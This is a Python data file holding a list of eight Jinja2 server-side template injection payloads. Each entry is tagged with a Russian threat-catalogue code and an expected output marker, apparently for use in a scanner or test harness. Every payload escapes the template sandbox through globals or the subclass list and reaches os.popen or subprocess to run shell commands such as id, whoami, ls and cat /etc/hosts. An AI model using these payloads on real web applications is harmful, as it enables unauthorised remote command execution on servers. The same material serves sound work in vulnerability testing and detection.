ubi_payloads = [
    {
        "ubi": "УБИ.4",
        "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "expected": "uid=",  # признак успешного выполнения
        "engine": "Jinja2"
    },
    {
        "ubi": "УБИ.4",
        "payload": "{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}",
        "expected": None,
        "engine": "Jinja2"
    },
    {
        "ubi": "УБИ.5",
        "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('ls',shell=True,stdout=-1).communicate()[0].decode() }}",
        "expected": None,
        "engine": "Jinja2"
    },
        {
        "ubi": "УБИ.4",
        "payload": "{{ namespace().__class__.__init__.__globals__.os.popen('id').read() }}",
        "expected": "uid=",
        "engine": "Jinja2"
    },
    {
        "ubi": "УБИ.4",
        "payload": "{{ url_for.__globals__['os'].popen('whoami').read() }}",
        "expected": None,
        "engine": "Jinja2"
    },
    {
        "ubi": "УБИ.5",
        "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('cat /etc/hosts',shell=True,stdout=-1).communicate()[0].decode() }}",
        "expected": "localhost",
        "engine": "Jinja2"
    },
    {
        "ubi": "УБИ.7",
        "payload": "{{ self._TemplateReference__context.cycler.__init__.__globals__['os'].popen('ls').read() }}",
        "expected": None,
        "engine": "Jinja2"
    },
    {
        "ubi": "УБИ.11",
        "payload": "{{ config.__class__.__init__.__globals__['os'].popen('echo test').read() }}",
        "expected": "test",
        "engine": "Jinja2"
    }
]
